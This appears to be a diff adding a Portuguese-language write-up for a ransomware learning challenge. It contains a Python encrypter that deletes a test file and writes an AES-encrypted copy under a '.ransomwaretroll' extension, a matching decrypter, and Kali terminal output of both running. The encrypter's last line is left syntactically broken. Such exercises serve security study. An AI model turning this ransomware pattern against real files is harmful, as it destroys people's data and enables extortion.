@@ -1,0 +1,71 @@
+Ferramenta de criptografia:
+
+import os
+import pyaes
+
+
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+os.remove(file_name)
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+crypto_data = aes.encrypt(file_data)
+
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close(
+
+
+
+Ferramenta de descriptografia:
+
+import os
+import pyaes
+
+file_name = "teste.txt.ransomwaretroll"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypt_data = aes.decrypt(file_data)
+
+os.remove(file_name)
+
+new_file = "teste.txt"
+new_file = open(f'{new_file}', "wb")
+new_file.write(decrypt_data)
+new_file.close()
+
+
+
+Resultado:
+┌──(root㉿kali)-[/home/kali/ransomware/cibersecurity-desafio-ransomware]
+└─# python encrypter.py teste.txt
+                                                                                           
+┌──(root㉿kali)-[/home/kali/ransomware/cibersecurity-desafio-ransomware]
+└─# cat teste.txt.ransomwaretroll 
+Ζ�Fb�tq/                                                                                           
+┌──(root㉿kali)-[/home/kali/ransomware/cibersecurity-desafio-ransomware]
+└─# ls
+decrypter.py  encrypter.py  teste.txt.ransomwaretroll
+                                                                                           
+┌──(root㉿kali)-[/home/kali/ransomware/cibersecurity-desafio-ransomware]
+└─# python decrypter.py          
+                                                                                           
+┌──(root㉿kali)-[/home/kali/ransomware/cibersecurity-desafio-ransomware]
+└─# cat teste.txt                
+alo brasil 
+
+
+
+
+
+
